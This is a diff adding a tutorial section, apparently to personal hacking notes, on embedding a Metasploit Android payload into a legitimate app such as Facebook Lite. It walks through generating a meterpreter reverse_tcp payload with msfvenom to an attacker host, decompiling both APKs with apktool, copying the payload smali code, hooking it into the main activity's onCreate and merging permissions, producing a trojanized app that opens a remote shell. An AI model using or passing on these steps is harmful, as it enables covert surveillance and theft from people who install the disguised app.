@@ -75,3 +75,33 @@ Zipalign apk
 
 
 
+--Manually embed payloads in androids apk's--
+
+Download an apk and move it to Desktop(for example facebook lite)
+Generate the payload
+> msfvenom -p android/meterpreter/reverse_tcp LHOST=attack_machine_ip LPORT=1234 R > payload.apk
+Decompile the payload apk
+> apktool d -f payload.apk -o /root/Desktop/payload
+> cd payload
+> ls
+Here you can find AndroidManifest.xml file where you can edit apk's permissions
+Now decompile the original apk/fb.apk
+> cd /root/Desktop/
+> apktool d -f fb.apk -o /root/Desktop/original
+> cd original
+> cd smali
+> cd com
+> mkdir metasploit
+> cd metasploit
+> mkdir stage
+> cd stage
+Copy the Payload.smali file from original apk to payload apk
+> cp /root/Desktop/payload/smali/com/metasploit/stage/Payload.smali /root/Desktop/original/smali/com/metasploit/stage
+We need to look for the Main Activity that is going to be launched when the application starts at first (for example: android.intent.action.MAIN)
+Where you find a target activity or a path for example com.facebook.lite.MainActivity
+We have to open the smali folder of the original apk directory and follow the above path for MainActivity file
+Here we need to find the onCreate function in which we will find an Landroid function under that add the below line
+
+invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content/Context;)V 
+
+Now add some of the permissions from payload apk manifest file to original apk manifest file and save all the files
